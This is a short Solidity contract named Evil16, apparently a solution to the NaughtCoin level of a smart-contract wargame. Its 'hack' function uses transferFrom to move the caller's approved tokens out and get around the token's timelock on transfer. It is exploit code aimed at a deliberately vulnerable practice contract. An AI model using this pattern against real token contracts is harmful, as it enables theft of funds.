// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";
import "hardhat/console.sol";

contract Evil16 {
    NaughtCoin target;

    constructor(address _target) {
        target = NaughtCoin(_target);
    }

    function hack(uint256 amount) external {
        target.transferFrom(msg.sender, address(this), amount);
    }
}
